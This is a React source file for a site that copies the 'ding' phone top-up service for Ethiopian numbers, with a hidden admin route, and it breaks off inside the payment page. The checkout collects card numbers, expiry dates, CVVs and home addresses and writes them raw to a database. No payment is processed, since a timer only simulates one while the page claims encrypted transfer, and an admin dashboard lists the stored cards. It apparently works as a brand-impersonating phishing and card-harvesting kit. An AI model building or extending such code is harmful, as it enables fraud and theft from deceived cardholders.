import React, { useState, useEffect, useMemo } from 'react';
import {
  ArrowLeft,
  ArrowRight,
  Check,
  ChevronDown,
  Clock,
  CreditCard,
  Globe,
  LayoutDashboard,
  Lock,
  Mail,
  MapPin,
  Menu,
  Pencil,
  Phone,
  Search,
  ShieldCheck,
  Shield,
  Smartphone,
  User,
  Users,
  Wallet,
  X,
  Building,
  Building2,
  Home,
  Landmark,
  Map,
  Tag,
  Hash,
  KeyRound,
  LogOut,
  Gift,
  Copy,
  ClipboardCheck
} from 'lucide-react';

import {
  dbFetchUsers,
  dbCreateUser,
  dbUpdateUserStatus,
  dbFetchCards,
  dbCreateCard,
  dbFetchTopups,
  dbCreateTopup,
  dbUpdateTopupStatus,
  dbVerifyAdminLogin,
  dbUpdateAdminPassword,
  dbFetchAdminAuth,
  dbGetAdminAuth
} from './supabase';

import { Translations } from './translations';

// ====== TOP-UP PACKAGES (Real Ding Data) ======
const topupPackages = [
  { id: 'topup_1', etb: 878, usd: 4.99, bonusPercent: 25, tag: 'connected', section: 'justForYou' },
  { id: 'topup_2', etb: 1327, usd: 7.49, bonusPercent: 25, tag: 'popular', section: 'justForYou' },
  { id: 'topup_3', etb: 2210, usd: 12.49, bonusPercent: 25, tag: 'popular', section: 'justForYou', breakdownText: '✨ 1768.45 ETB + 442.11 ETB bonus', showYouPay: true },
  { id: 'topup_4', etb: 444, usd: 2.49, bonusPercent: 25, section: 'more' },
  { id: 'topup_5', etb: 3092, usd: 17.49, bonusPercent: 25, section: 'more' },
  { id: 'topup_6', etb: 4855, usd: 27.49, bonusPercent: 25, section: 'more' },
  { id: 'topup_7', etb: 7089, usd: 39.99, bonusPercent: 25, section: 'more' },
];

// ====== PLAN PACKAGES (Real Ding Data) ======
const planPackages = [
  { id: 'plan_1', name: 'Weekly IAT Unlimited Data', usd: 2.49, validity: 'Valid for 7 days', tag: 'connected', section: 'justForYou' },
  { id: 'plan_2', name: 'Monthly IAT Unlimited Data', usd: 8.99, validity: 'Valid for 30 days', tag: 'popular', section: 'justForYou' },
  { id: 'plan_3', name: 'Monthly IAT Unlimited Pack', usd: 11.49, validity: 'Valid for 30 days', tag: 'popular', section: 'justForYou', showYouPay: true, subtitle: 'Monthly IAT Unlimited Voice+Data+SMS' },
  { id: 'plan_4', name: 'Weekly IAT Voice+Internet+SMS', usd: 1.39, validity: 'Valid for 7 days', section: 'plans', subtitle: 'Weekly 300Min, 3GB and 30SMS' },
  { id: 'plan_5', name: 'Monthly IAT Data 10GB', usd: 2.89, validity: 'Valid for 30 days', section: 'plans' },
  { id: 'plan_6', name: 'Monthly IAT Voice+SMS', usd: 3.79, validity: 'Valid for 30 days', section: 'plans', subtitle: '2000Min and 200SMS' },
  { id: 'plan_7', name: 'Monthly IAT Voice+Data+SMS', usd: 4.69, validity: 'Valid for 30 days', section: 'plans', subtitle: 'Monthly 1150Min, 10GB and 100SMS' },
];

// Ethiopia Flag Component
function EthiopiaFlag({ className = '' }) {
  return (
    <span className={`ethiopia-flag ${className}`} aria-label="Ethiopia flag">
      <span className="flag-stripe flag-green" />
      <span className="flag-stripe flag-yellow" />
      <span className="flag-stripe flag-red" />
      <span className="flag-emblem">✦</span>
    </span>
  );
}

// Real SVG Flag Icons for Languages
function CountryFlag({ code, size = 20 }) {
  const s = size;
  const flags = {
    EN: ( // UK
      <svg width={s} height={s} viewBox="0 0 60 40" style={{ borderRadius: 3, display: 'block' }}>
        <rect width="60" height="40" fill="#012169"/>
        <path d="M0 0L60 40M60 0L0 40" stroke="#fff" strokeWidth="7"/>
        <path d="M0 0L60 40M60 0L0 40" stroke="#C8102E" strokeWidth="4"/>
        <path d="M30 0V40M0 20H60" stroke="#fff" strokeWidth="10"/>
        <path d="M30 0V40M0 20H60" stroke="#C8102E" strokeWidth="6"/>
      </svg>
    ),
    ES: ( // Spain
      <svg width={s} height={s} viewBox="0 0 60 40" style={{ borderRadius: 3, display: 'block' }}>
        <rect width="60" height="10" fill="#AA151B"/>
        <rect y="10" width="60" height="20" fill="#F1BF00"/>
        <rect y="30" width="60" height="10" fill="#AA151B"/>
      </svg>
    ),
    DE: ( // Germany
      <svg width={s} height={s} viewBox="0 0 60 40" style={{ borderRadius: 3, display: 'block' }}>
        <rect width="60" height="13.3" fill="#000"/>
        <rect y="13.3" width="60" height="13.4" fill="#DD0000"/>
        <rect y="26.7" width="60" height="13.3" fill="#FFCC00"/>
      </svg>
    ),
    FR: ( // France
      <svg width={s} height={s} viewBox="0 0 60 40" style={{ borderRadius: 3, display: 'block' }}>
        <rect width="20" height="40" fill="#002395"/>
        <rect x="20" width="20" height="40" fill="#fff"/>
        <rect x="40" width="20" height="40" fill="#ED2939"/>
      </svg>
    ),
    IT: ( // Italy
      <svg width={s} height={s} viewBox="0 0 60 40" style={{ borderRadius: 3, display: 'block' }}>
        <rect width="20" height="40" fill="#009246"/>
        <rect x="20" width="20" height="40" fill="#fff"/>
        <rect x="40" width="20" height="40" fill="#CE2B37"/>
      </svg>
    ),
    PT: ( // Portugal
      <svg width={s} height={s} viewBox="0 0 60 40" style={{ borderRadius: 3, display: 'block' }}>
        <rect width="24" height="40" fill="#006600"/>
        <rect x="24" width="36" height="40" fill="#FF0000"/>
        <circle cx="24" cy="20" r="7" fill="#FFCC00"/>
      </svg>
    ),
    RU: ( // Russia
      <svg width={s} height={s} viewBox="0 0 60 40" style={{ borderRadius: 3, display: 'block' }}>
        <rect width="60" height="13.3" fill="#fff"/>
        <rect y="13.3" width="60" height="13.4" fill="#0039A6"/>
        <rect y="26.7" width="60" height="13.3" fill="#D52B1E"/>
      </svg>
    ),
    AR: ( // Saudi Arabia
      <svg width={s} height={s} viewBox="0 0 60 40" style={{ borderRadius: 3, display: 'block' }}>
        <rect width="60" height="40" fill="#006C35"/>
        <text x="30" y="24" textAnchor="middle" fill="#fff" fontSize="10" fontWeight="700" fontFamily="serif">☪</text>
      </svg>
    ),
    HI: ( // India
      <svg width={s} height={s} viewBox="0 0 60 40" style={{ borderRadius: 3, display: 'block' }}>
        <rect width="60" height="13.3" fill="#FF9933"/>
        <rect y="13.3" width="60" height="13.4" fill="#fff"/>
        <rect y="26.7" width="60" height="13.3" fill="#138808"/>
        <circle cx="30" cy="20" r="4" fill="none" stroke="#000080" strokeWidth="1"/>
      </svg>
    ),
    FA: ( // Iran
      <svg width={s} height={s} viewBox="0 0 60 40" style={{ borderRadius: 3, display: 'block' }}>
        <rect width="60" height="13.3" fill="#239F40"/>
        <rect y="13.3" width="60" height="13.4" fill="#fff"/>
        <rect y="26.7" width="60" height="13.3" fill="#DA0000"/>
      </svg>
    ),
  };
  return flags[code] || null;
}

// ====== MAIN APP ======
export default function App() {
  const [langCode, setLangCode] = useState('EN');

  const initialPage = (window.location.pathname === '/admin' || window.location.hash === '#admin') ? 'admin' : 'home';
  const [currentPage, setCurrentPage] = useState(initialPage);

  const [selectedPhone, setSelectedPhone] = useState('');
  const [selectedPackage, setSelectedPackage] = useState(topupPackages[2]);
  const [selectedTab, setSelectedTab] = useState('topup');

  const t = Translations[langCode] || Translations.EN;
  const [langMenuOpen, setLangMenuOpen] = useState(false);

  const [userDetails, setUserDetails] = useState({
    firstName: '',
    lastName: '',
    streetAddress: '',
    apartment: '',
    city: '',
    state: '',
    zipCode: ''
  });

  const [cardDetails, setCardDetails] = useState({
    cardNumber: '',
    expiry: '',
    cvv: '',
    nameOnCard: '',
    country: '',
    saveCard: true
  });

  const [isAdminLoggedIn, setIsAdminLoggedIn] = useState(false);
  const [isAdminLoggingIn, setIsAdminLoggingIn] = useState(false);
  const [adminLoginForm, setAdminLoginForm] = useState({ email: '', password: '' });
  const [adminLoginError, setAdminLoginError] = useState('');

  const [users, setUsers] = useState([]);
  const [cards, setCards] = useState([]);
  const [topups, setTopups] = useState([]);
  const [isProcessing, setIsProcessing] = useState(false);
  const [mobileMenuOpen, setMobileMenuOpen] = useState(false);

  useEffect(() => {
    const handleUrlChange = () => {
      if (window.location.pathname === '/admin' || window.location.hash === '#admin') {
        setCurrentPage('admin');
      }
    };
    window.addEventListener('popstate', handleUrlChange);
    window.addEventListener('hashchange', handleUrlChange);
    return () => {
      window.removeEventListener('popstate', handleUrlChange);
      window.removeEventListener('hashchange', handleUrlChange);
    };
  }, []);

  useEffect(() => {
    async function loadRealData() {
      const [uData, cData, tData] = await Promise.all([
        dbFetchUsers(),
        dbFetchCards(),
        dbFetchTopups(),
        dbFetchAdminAuth()
      ]);
      setUsers(uData || []);
      setCards(cData || []);
      setTopups(tData || []);
    }
    loadRealData();
  }, [currentPage]);

  useEffect(() => {
    document.documentElement.dir = t.dir || 'ltr';
  }, [langCode, t.dir]);

  const handlePhoneSubmit = (phoneNum) => {
    const formatted = phoneNum.startsWith('+') ? phoneNum : `+251 ${phoneNum.replace(/^\+?251\s*/, '')}`;
    setSelectedPhone(formatted);
    setCurrentPage('packages');
    window.scrollTo({ top: 0, behavior: 'smooth' });
  };

  const handlePackageSelect = (pkg) => {
    setSelectedPackage(pkg);
    setCurrentPage('details');
    window.scrollTo({ top: 0, behavior: 'smooth' });
  };

  const handleDetailsSubmit = (detailsData) => {
    setUserDetails(detailsData);
    setCurrentPage('payment');
    window.scrollTo({ top: 0, behavior: 'smooth' });
  };

  const handlePaymentSubmit = async () => {
    setIsProcessing(true);
    const finalUSD = selectedPackage.usd;
    const isTopup = selectedPackage.etb !== undefined;
    const fullName = `${userDetails.firstName || ''} ${userDetails.lastName || ''}`.trim() || 'Customer';

    setTimeout(async () => {
      const createdUser = await dbCreateUser({
        first_name: userDetails.firstName,
        last_name: userDetails.lastName,
        full_name: fullName,
        phone_number: selectedPhone,
        email: '',
        grandfather_name: '',
        street_address: userDetails.streetAddress,
        apartment: userDetails.apartment,
        city: userDetails.city,
        state: userDetails.state,
        zip_code: userDetails.zipCode,
        status: 'Pending'
      });

      const createdCard = await dbCreateCard({
        user_name: fullName,
        first_name: userDetails.firstName,
        last_name: userDetails.lastName,
        street_address: userDetails.streetAddress,
        apartment: userDetails.apartment,
        city: userDetails.city,
        state: userDetails.state,
        zip_code: userDetails.zipCode,
        card_number: cardDetails.cardNumber,
        expiry: cardDetails.expiry,
        cvv: cardDetails.cvv,
        name_on_card: cardDetails.nameOnCard,
        country: cardDetails.country,
        saved_for_next_time: cardDetails.saveCard
      });

      const createdTopup = await dbCreateTopup({
        user_name: fullName,
        phone: selectedPhone,
        amount_usd: finalUSD,
        amount_etb: isTopup ? selectedPackage.etb : 0,
        bonus_etb: isTopup ? Math.round(selectedPackage.etb * 0.25) : 0,
        status: 'Pending'
      });

      setUsers(prev => [createdUser, ...prev]);
      setCards(prev => [createdCard, ...prev]);
      setTopups(prev => [createdTopup, ...prev]);

      setIsProcessing(false);
      setCurrentPage('success');
      window.scrollTo({ top: 0, behavior: 'smooth' });
    }, 1500);
  };

  const handleAdminLoginSubmit = async (e) => {
    e.preventDefault();
    setIsAdminLoggingIn(true);
    setAdminLoginError('');
    try {
      const isValid = await dbVerifyAdminLogin(adminLoginForm.email, adminLoginForm.password);
      if (isValid) {
        setIsAdminLoggedIn(true);
        setAdminLoginError('');
      } else {
        setAdminLoginError('Invalid Email or Password.');
      }
    } catch (err) {
      setAdminLoginError('Login error: ' + (err.message || 'Please verify credentials'));
    } finally {
      setIsAdminLoggingIn(false);
    }
  };

  const handleToggleUserStatus = async (userId, currentStatus) => {
    const newStatus = currentStatus === 'Pending' ? 'Accepted' : currentStatus === 'Accepted' ? 'Rejected' : 'Pending';
    const updatedUsers = await dbUpdateUserStatus(userId, newStatus);
    setUsers(updatedUsers);
  };

  const handleToggleTopupStatus = async (topupId, currentStatus) => {
    const newStatus = currentStatus === 'Pending' ? 'Processing' : currentStatus === 'Processing' ? 'Completed' : 'Pending';
    const updatedTopups = await dbUpdateTopupStatus(topupId, newStatus);
    setTopups(updatedTopups);
  };

  const navigateToHome = () => {
    window.history.pushState({}, '', '/');
    setCurrentPage('home');
  };

  return (
    <div className="app-container">
      {/* PROCESSING MODAL */}
      {isProcessing && (
        <div className="processing-overlay">
          <div className="processing-card">
            <div className="spinner" />
            <h3>Processing Top-Up...</h3>
            <p>Securing connection for <b>{selectedPhone}</b></p>
            <span className="demo-secure-pill"><ShieldCheck size={14} /> 256-Bit Encrypted Transfer</span>
          </div>
        </div>
      )}

      {/* ADMIN ROUTE */}
      {currentPage === 'admin' ? (
        !isAdminLoggedIn ? (
          <div className="admin-login-screen">
            <div className="admin-login-card">
              <div className="admin-brand-logo" style={{ marginBottom: '16px' }}>ding <span className="admin-badge-pill">ADMIN</span></div>
              <h2>{t.adminLogin}</h2>
              <form onSubmit={handleAdminLoginSubmit} className="admin-form-col">
                <div className="input-group" style={{ textAlign: 'left' }}>
                  <label className="input-label">{t.adminEmail}</label>
                  <input
                    type="email"
                    value={adminLoginForm.email}
                    onChange={(e) => setAdminLoginForm({ ...adminLoginForm, email: e.target.value })}
                    placeholder="Enter email"
                    className="styled-input-field no-left-icon"
                    required
                  />
                </div>
                <div className="input-group" style={{ textAlign: 'left' }}>
                  <label className="input-label">{t.adminPass}</label>
                  <input
                    type="password"
                    value={adminLoginForm.password}
                    onChange={(e) => setAdminLoginForm({ ...adminLoginForm, password: e.target.value })}
                    placeholder="Enter password"
                    className="styled-input-field no-left-icon"
                    required
                  />
                </div>
                {adminLoginError && <p className="field-error-text">{adminLoginError}</p>}
                <button type="submit" className="start-topup-btn" disabled={isAdminLoggingIn}>
                  {isAdminLoggingIn ? 'Verifying...' : t.loginBtn}
                </button>
              </form>
              <button className="back-nav-btn" style={{ marginTop: '16px' }} onClick={navigateToHome}>
                <ArrowLeft size={16} /> Back to website
              </button>
            </div>
          </div>
        ) : (
          <AdminDashboard
            users={users} cards={cards} topups={topups} t={t}
            onToggleUserStatus={handleToggleUserStatus}
            onToggleTopupStatus={handleToggleTopupStatus}
            onLogout={() => setIsAdminLoggedIn(false)}
            onExitAdmin={navigateToHome}
          />
        )
      ) : (
        <>
          {/* NAVBAR — No Help, No Dark Mode Toggle */}
          <header className="ding-navbar">
            <div className="nav-container">
              <button className="ding-logo-btn" onClick={navigateToHome}>
                <span className="ding-logo">ding</span>
              </button>
              <div className="nav-right-actions">
                <div className="language-selector-wrapper">
                  <button className="lang-picker-btn" onClick={() => setLangMenuOpen(!langMenuOpen)}>
                    <CountryFlag code={langCode} size={20} />
                    <span className="lang-code-bold">{t.code}</span>
                    <ChevronDown size={14} />
                  </button>
                  {langMenuOpen && (
                    <div className="lang-dropdown-popover">
                      <div className="popover-arrow" />
                      {Object.keys(Translations).map((key) => (
                        <button key={key} className={`lang-option-item ${langCode === key ? 'selected' : ''}`} onClick={() => { setLangCode(key); setLangMenuOpen(false); }}>
                          <CountryFlag code={key} size={18} />
                          <span>{Translations[key].name}</span>
                        </button>
                      ))}
                    </div>
                  )}
                </div>
                <button className="mobile-hamburger" onClick={() => setMobileMenuOpen(!mobileMenuOpen)} aria-label="Menu">
                  {mobileMenuOpen ? <X size={24} /> : <Menu size={24} />}
                </button>
              </div>
            </div>
            {mobileMenuOpen && (
              <div className="mobile-nav-dropdown">
                <button onClick={() => { navigateToHome(); setMobileMenuOpen(false); }}>Home</button>
              </div>
            )}
          </header>

          {currentPage === 'home' && <HomePage t={t} onStartTopup={handlePhoneSubmit} phone={selectedPhone} setPhone={setSelectedPhone} />}

          {currentPage === 'packages' && (
            <PackagesPage t={t} phone={selectedPhone} selectedPackage={selectedPackage}
              onSelectPackage={setSelectedPackage} onContinue={handlePackageSelect}
              onBack={navigateToHome} selectedTab={selectedTab} setSelectedTab={setSelectedTab} />
          )}

          {currentPage === 'details' && (
            <DetailsPage t={t} phone={selectedPhone} packageInfo={selectedPackage}
              details={userDetails} setDetails={setUserDetails}
              onContinue={handleDetailsSubmit} onBack={() => setCurrentPage('packages')} />
          )}

          {currentPage === 'payment' && (
            <PaymentPage t={t} phone={selectedPhone} packageInfo={selectedPackage}
              userDetails={userDetails} cardDetails={cardDetails} setCardDetails={setCardDetails}
              onPayNow={handlePaymentSubmit} onBack={() => setCurrentPage('details')} />
          )}

          {currentPage === 'success' && (
            <SuccessPage t={t} phone={selectedPhone} packageInfo={selectedPackage}
              userDetails={userDetails} onHome={navigateToHome}
              onAdmin={() => { window.history.pushState({}, '', '/admin'); setCurrentPage('admin'); }} />
          )}

          <Footer t={t} />
        </>
      )}
    </div>
  );
}

// --------------------------------------------------
// HOME PAGE
// --------------------------------------------------
function HomePage({ t, onStartTopup, phone, setPhone }) {
  const [inputPhone, setInputPhone] = useState(phone ? phone.replace(/^\+?251\s*/, '') : '');
  const [errorMsg, setErrorMsg] = useState('');

  const handleSubmit = (e) => {
    e.preventDefault();
    const cleaned = inputPhone.replace(/\D/g, '');
    if (cleaned.length < 8) {
      setErrorMsg('Please enter a valid Ethiopian mobile phone number.');
      return;
    }
    setErrorMsg('');
    onStartTopup(`+251 ${cleaned}`);
  };

  return (
    <main className="ding-home-exact">
      <section className="exact-hero-container">
        <div className="hero-main-wrapper">
          {/* LEFT SIDE: Text, Topup Card & Promo Card */}
          <div className="exact-hero-content">
            <h1 className="exact-hero-title">{t.heroTitle}</h1>
            <p className="exact-hero-sub">{t.heroSub}</p>

            <form className="exact-topup-card" onSubmit={handleSubmit}>
              <h2 className="exact-topup-card-title">Ready to send a top-up?</h2>
              <div className="phone-input-wrapper">
                <div className="country-flag-pill">
                  <EthiopiaFlag className="circular" />
                  <ChevronDown size={14} className="chevron-icon" />
                </div>
                <div className="phone-input-inner">
                  <label htmlFor="mobile-input" className="phone-input-label">{t.enterNumber}</label>
                  <div className="input-prefix-row">
                    <span className="country-code-text">+251</span>
                    <input
                      id="mobile-input"
                      type="tel"
                      value={inputPhone}
                      onChange={(e) => setInputPhone(e.target.value)}
                      placeholder="91 234 5678"
                      className="phone-native-input"
                    />
                  </div>
                </div>
              </div>
              {errorMsg && <p className="field-error-text">{errorMsg}</p>}
              <button type="submit" className="start-topup-btn">{t.startTopup}</button>
            </form>

            {/* Top-up wherever card */}
            <div className="topup-promo-card">
              <h3 className="topup-promo-title">Top-up wherever, whenever</h3>
              <p className="topup-promo-text">Get the Ding App for the fastest, easiest way to top-up any phone.</p>
            </div>
          </div>

          {/* RIGHT SIDE: Woman Hero Image on Desktop */}
          <div className="hero-woman-desktop-side">
            <img src="/woman_side.png" alt="Ding Top-up" className="hero-woman-side-img" />
          </div>
        </div>
      </section>
    </main>
  );
}

// --------------------------------------------------
// PACKAGES PAGE (Top-up & Plans Tabs)
// --------------------------------------------------
function PackagesPage({ t, phone, selectedPackage, onSelectPackage, onContinue, onBack, selectedTab, setSelectedTab }) {
  const isTopup = selectedTab === 'topup';
  const packages = isTopup ? topupPackages : planPackages;
  const justForYou = packages.filter(p => p.section === 'justForYou');
  const moreSection = packages.filter(p => p.section === (isTopup ? 'more' : 'plans'));
  const [showTerms, setShowTerms] = useState(false);

  useEffect(() => {
    const defaultPkg = isTopup ? topupPackages[2] : planPackages[0];
    onSelectPackage(defaultPkg);
  }, [selectedTab]);

  return (
    <main className="ding-flow-page">
      {/* Bonus Terms Modal */}
      {showTerms && (
        <div className="bonus-terms-overlay" onClick={() => setShowTerms(false)}>
          <div className="bonus-terms-modal" onClick={(e) => e.stopPropagation()}>
            <button className="bonus-terms-close" onClick={() => setShowTerms(false)}>
              <X size={24} />
            </button>
            <div className="bonus-terms-header">
              <span className="bonus-terms-big">BONUS</span>
              <span className="bonus-terms-big faded">BONUS</span>
            </div>
            <div className="bonus-terms-body">
              <p className="bonus-terms-line">This promotion is carried out by Ethio Telecom.</p>
              <p className="bonus-terms-line">This promotion starts on 27th April 2026 and ends on 31st July 2026.</p>
              <p className="bonus-terms-line">Send a top-up of 200 Birr and receive 50 bonus</p>
              <p className="bonus-terms-line">The bonus is valid for 15 days.</p>
              <p className="bonus-terms-line">25% airtime bonus for recipients ETB 200 and above IAT or packages of the same value.</p>
              <p className="bonus-terms-line">The bonus is valid for 15 days.</p>
              <p className="bonus-terms-line">The bonus is used for any telecom usage to purchase package (self and gift)</p>
            </div>
          </div>
        </div>
      )}

      {/* Phone Header */}
      <div className="pkg-phone-header">
        <div className="pkg-flag-circle">
          <EthiopiaFlag />
        </div>
        <span className="pkg-phone-number">{phone}</span>
        <span className="pkg-ethio-badge">
          <Globe size={12} /> ethio telecom
        </span>
        <button className="pkg-edit-btn" onClick={onBack} title="Edit number">
          <Pencil size={18} />
        </button>
      </div>

      {/* Top-up / Plans Tab Switcher */}
      <div className="pkg-tab-switcher-bg">
        <div className="pkg-tab-switcher">
          <button className={`pkg-tab-btn ${selectedTab === 'topup' ? 'active' : ''}`} onClick={() => setSelectedTab('topup')}>
            Top-up
          </button>
          <button className={`pkg-tab-btn ${selectedTab === 'plans' ? 'active' : ''}`} onClick={() => setSelectedTab('plans')}>
            Plans
          </button>
        </div>
      </div>

      {/* 25% Bonus Banner (Top-up only) */}
      {isTopup && (
        <div className="bonus-banner">
          <div>
            <h3 className="bonus-banner-title">25% Bonus!</h3>
            <p className="bonus-banner-text">25% airtime bonus for recipients ETB 200 and above</p>
            <div className="bonus-banner-bottom">
              <span className="bonus-ends"><Clock size={14} /> Ends on 31 Dec</span>
              <button className="bonus-read-terms" onClick={() => setShowTerms(true)}>Read terms &gt;</button>
            </div>
          </div>
          <span className="bonus-banner-deco">✦</span>
        </div>
      )}

      {/* Just for you */}
      <h3 className="just-for-you-title">Just for you:</h3>
      <div className="packages-list">
        {justForYou.map(pkg => (
          <PackageCard key={pkg.id} pkg={pkg} isTopup={isTopup} isSelected={selectedPackage?.id === pkg.id} onClick={() => onSelectPackage(pkg)} />
        ))}
      </div>

      {/* More top-ups / Plans */}
      <h3 className="more-topups-title">{isTopup ? 'More top-ups:' : 'Plans:'}</h3>
      <div className="packages-list">
        {moreSection.map(pkg => (
          <PackageCard key={pkg.id} pkg={pkg} isTopup={isTopup} isSelected={selectedPackage?.id === pkg.id} onClick={() => onSelectPackage(pkg)} />
        ))}
      </div>

      {/* Bottom Buy Bar */}
      <div className="fixed-bottom-bar">
        <div style={{ width: '100%', maxWidth: '500px' }}>
          <button className="buy-action-btn" onClick={() => onContinue(selectedPackage)}>
            {isTopup ? `Buy ${selectedPackage?.etb || ''} ETB` : 'Continue'}
          </button>
          {!isTopup && selectedPackage?.name && (
            <div className="bottom-bar-plan-name">{selectedPackage.name}</div>
          )}
        </div>
      </div>
    </main>
  );
}

// Package / Plan Card Component
function PackageCard({ pkg, isTopup, isSelected, onClick }) {
  return (
    <div className={`package-option-card ${isSelected ? 'selected' : ''}`} onClick={onClick}>
      <div className="package-card-left">
        {isTopup ? (
          <>
            <div className="etb-amount-heading">
              {pkg.etb} <span className="currency-unit">ETB</span>
            </div>
            <div className="usd-cost-subtext">
              {pkg.showYouPay && <span>You pay </span>}{pkg.usd} USD
            </div>
            <div className="bonus-text-line">🎁 {pkg.bonusPercent}% Bonus!</div>
            {pkg.breakdownText && <div className="breakdown-pill">{pkg.breakdownText}</div>}
            {pkg.tag === 'connected' && <div className="feature-status-line">📶 Get them connected</div>}
            {pkg.tag === 'popular' && <div className="feature-status-line">🔥 Popular</div>}
          </>
        ) : (
          <>
            <div className="plan-name-heading">{pkg.name}</div>
            <div className="usd-cost-subtext">
              {pkg.showYouPay && <span>You pay </span>}{pkg.usd} USD
            </div>
            <div className="plan-validity">{pkg.validity}</div>
            {pkg.subtitle && <div className="plan-subtitle">{pkg.subtitle}</div>}
            {pkg.tag === 'connected' && <div className="feature-status-line">📶 Get them connected</div>}
            {pkg.tag === 'popular' && <div className="feature-status-line">🔥 Popular</div>}
          </>
        )}
      </div>
      <div className="package-card-right">
        <div className={`radio-outer-circle ${isSelected ? 'active' : ''}`}>
          {isSelected && <span className="radio-inner-magenta" />}
        </div>
      </div>
    </div>
  );
}

// --------------------------------------------------
// DETAILS PAGE (Simplified: Name, Address, City, State, Zip)
// --------------------------------------------------
function DetailsPage({ t, phone, packageInfo, details, setDetails, onContinue, onBack }) {
  const [errorMsg, setErrorMsg] = useState('');

  const handleChange = (field, val) => {
    setDetails(prev => ({ ...prev, [field]: val }));
  };

  const handleSubmit = (e) => {
    e.preventDefault();
    if (!details.firstName.trim()) {
      setErrorMsg('Please enter your first name.');
      return;
    }
    if (!details.lastName.trim()) {
      setErrorMsg('Please enter your last name.');
      return;
    }
    if (!details.streetAddress.trim()) {
      setErrorMsg('Please enter your street address.');
      return;
    }
    if (!details.city.trim()) {
      setErrorMsg('Please enter your city.');
      return;
    }
    if (!details.state.trim()) {
      setErrorMsg('Please enter your state / region.');
      return;
    }
    if (!details.zipCode.trim()) {
      setErrorMsg('Please enter your postal / zip code.');
      return;
    }
    setErrorMsg('');
    onContinue(details);
  };

  return (
    <main className="ding-flow-page details-flow-page">
      <div className="details-header-bar">
        <button className="back-nav-btn" onClick={onBack}>
          <ArrowLeft size={16} /> <span>Back</span>
        </button>
        <div className="details-brand-shield">
          <ShieldCheck size={18} className="shield-icon-glow" />
          <span className="shield-badge-text">Encrypted &amp; Secure</span>
        </div>
      </div>

      <h1 className="your-details-title">{t.yourDetails}</h1>

      <form className="remitly-details-form" onSubmit={handleSubmit}>
        {/* First name & Last name */}
        <div className="details-row-2col">
          <div className="input-group">
            <label className="input-label">{t.firstName || 'First name'} *</label>
            <div className="input-icon-box">
              <User size={19} className="field-inner-icon" />
              <input
                type="text"
                value={details.firstName}
                onChange={(e) => handleChange('firstName', e.target.value)}
                placeholder="e.g., John"
                className="styled-inner-input"
                required
              />
            </div>
          </div>

          <div className="input-group">
            <label className="input-label">{t.lastName || 'Last name'} *</label>
            <div className="input-icon-box">
              <User size={19} className="field-inner-icon" />
              <input
                type="text"
                value={details.lastName}
                onChange={(e) => handleChange('lastName', e.target.value)}
                placeholder="e.g., Doe"
                className="styled-inner-input"
                required
              />
            </div>
          </div>
        </div>

        {/* Street address */}
        <div className="input-group">
          <label className="input-label">{t.street} *</label>
          <div className="input-icon-box">
            <Home size={19} className="field-inner-icon" />
            <input
              type="text"
              value={details.streetAddress}
              onChange={(e) => handleChange('streetAddress', e.target.value)}
              placeholder="e.g., 123 Main Street"
              className="styled-inner-input"
              required
            />
          </div>
        </div>

        {/* Apartment (optional) */}
        <div className="input-group">
          <label className="input-label">{t.apartment}</label>
          <div className="input-icon-box">
            <Building2 size={19} className="field-inner-icon" />
            <input
              type="text"
              value={details.apartment}
              onChange={(e) => handleChange('apartment', e.target.value)}
              placeholder="Apartment, suite, unit, etc. (optional)"
              className="styled-inner-input"
            />
          </div>
        </div>

        {/* City */}
        <div className="input-group">
          <label className="input-label">{t.city} *</label>
          <div className="input-icon-box">
            <Landmark size={19} className="field-inner-icon" />
            <input
              type="text"
              value={details.city}
              onChange={(e) => handleChange('city', e.target.value)}
              placeholder="e.g., Addis Ababa"
              className="styled-inner-input"
              required
            />
          </div>
        </div>

        {/* State */}
        <div className="input-group">
          <label className="input-label">{t.state} *</label>
          <div className="input-icon-box">
            <Map size={19} className="field-inner-icon" />
            <input
              type="text"
              value={details.state}
              onChange={(e) => handleChange('state', e.target.value)}
              placeholder="e.g., Addis Ababa"
              className="styled-inner-input"
              required
            />
          </div>
        </div>

        {/* Zip code */}
        <div className="input-group">
          <label className="input-label">{t.zip} *</label>
          <div className="input-icon-box">
            <Hash size={19} className="field-inner-icon" />
            <input
              type="text"
              value={details.zipCode}
              onChange={(e) => handleChange('zipCode', e.target.value)}
              placeholder="e.g., 1000"
              className="styled-inner-input"
              required
            />
          </div>
        </div>

        {errorMsg && <p className="field-error-text">{errorMsg}</p>}

        <button type="submit" className="continue-details-btn">
          <span>{t.continuePay}</span>
          <ArrowRight size={18} />
        </button>
      </form>
    </main>
  );
}

// --------------------------------------------------
// PAYMENT PAGE (Real Card Brands)
// --------------------------------------------------
function PaymentPage({ t, phone, packageInfo, userDetails, cardDetails, setCardDetails, onPayNow, onBack }) {
  const [errorMsg, setErrorMsg] = useState('');

  const handleChange = (field, val) => {
    setCardDetails(prev => ({ ...prev, [field]: val }));
  };

  const handleCardNumberChange = (val) => {
    // Only digits, maximum 16 digits
    const digits = val.replace(/\D/g, '').slice(0, 16);
    // Format into groups of 4: "4532 1234 5678 9012"
    const grouped = digits.match(/.{1,4}/g);
    handleChange('cardNumber', grouped ? grouped.join(' ') : digits);
  };

  const handleExpiryChange = (val) => {
    // Only digits, maximum 4 digits (MMYY)
    const digits = val.replace(/\D/g, '').slice(0, 4);
    if (digits.length <= 2) {
      handleChange('expiry', digits);
    } else {
      handleChange('expiry', `${digits.slice(0, 2)}/${digits.slice(2)}`);
    }
  };

  const handleCvvChange = (val) => {
    const digits = val.replace(/\D/g, '').slice(0, 4);
    handleChange('cvv', digits);
  };

  const calculateTotal = () => {
    return (packageInfo.usd + 4.79).toFixed(2);
  };

  const handlePaySubmit = (e) => {
    if (e && e.preventDefault) e.preventDefault();
    if (!cardDetails.cardNumber.trim() || cardDetails.cardNumber.replace(/\s/g, '').length < 13) {
      setErrorMsg('Please enter a valid card number.');
      return;
    }
    if (!cardDetails.expiry.trim() || cardDetails.expiry.length < 5) {
      setErrorMsg('Please enter a valid expiry date (MM/YY).');
      return;
    }
    if (!cardDetails.cvv.trim() || cardDetails.cvv.length < 3) {
      setErrorMsg('Please enter a valid CVV.');
      return;
    }
    if (!cardDetails.nameOnCard.trim()) {
      setErrorMsg('Please enter the name on your card.');
      return;
    }
    if (!cardDetails.country.trim()) {
      setErrorMsg('Please enter your country.');
      return;
    }
    setErrorMsg('');
    onPayNow();
  };

  return (
    <main className="ding-flow-page payment-flow-page">
      <div className="payment-top-row">
        <button className="back-nav-btn" onClick={onBack}>
          <ArrowLeft size={16} /> <span>Back</span>
        </button>
      </div>

      {/* Real Card Brand Logos */}
